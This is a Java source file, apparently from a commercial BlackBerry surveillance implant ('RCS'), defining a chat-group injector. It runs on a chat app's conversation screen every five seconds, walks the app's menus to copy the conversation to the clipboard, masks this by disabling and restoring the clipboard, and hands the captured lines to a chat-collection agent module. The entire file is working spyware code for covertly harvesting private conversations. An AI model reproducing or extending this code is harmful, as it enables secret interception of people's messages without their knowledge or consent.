//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors.group;

import java.util.Vector;

import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;
import blackberry.injection.injectors.AInjector;
import blackberry.injection.injectors.conversation.ConversationScreen;
import blackberry.module.ModuleChat;

public abstract class ChatGroupInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ChatGInjector", DebugLevel.VERBOSE);
    //#endif

    ConversationScreen conversationScreen = new ConversationScreen();

    public abstract String getAppName();

    public abstract String getCodName();

    public String getPreferredMenuName() {
        //TODO: messages
        return "Yield";
    }

    public String[] getWantedScreen() {
        return new String[] { "ConversationScreen" };
    }

    /**
     * viene eseguito sul ConversationScreen, ogni 5 secondi
     */
    public final void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen");
        //#endif

        try {
            String conversation = extractConversation(screen);
            conversationScreen.getConversationScreen(conversation, this);
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }

    }

    private String extractConversation(Screen screen) {
        //#ifdef DEBUG
        debug.trace("extractConversation"); //$NON-NLS-1$
        //#endif

        String clip = null;

        disableClipboard();
        //1g.1=Copy Chat
        //1g.2=Copy History
        //1g.4=Copy Conversation
        if (MenuWalker.walk(new String[] {
                "Copy Chat", "Copy History", "Copy Conversation" }, //$NON-NLS-1$ //$NON-NLS-2$
                screen, true)) {

            clip = (String) Clipboard.getClipboard().get();
            //#ifdef DEBUG
            debug.trace("extractConversation: " + clip.length());
            //#endif

            setClipboard(clip);

        } else {
            //#ifdef DEBUG
            debug.info("NO Conversation screen!"); //$NON-NLS-1$
            //#endif
        }
        enableClipboard();
        return clip;
    }

    public void addLines(String partecipants, Vector lines) {
        //#ifdef DEBUG
        debug.trace("addLines");
        //#endif
        ModuleChat agent = (ModuleChat) ModuleChat.getInstance();
        agent.addLines(getAppName(), partecipants, lines);

    }

    public boolean enabled() {
        return enabledGroup && enabled;
    }

    static boolean enabledGroup;

    static public boolean enabledGroup() {
        return enabledGroup;
    }

    static public void enableGroup(boolean value) {
        enabledGroup = value;
    }

}
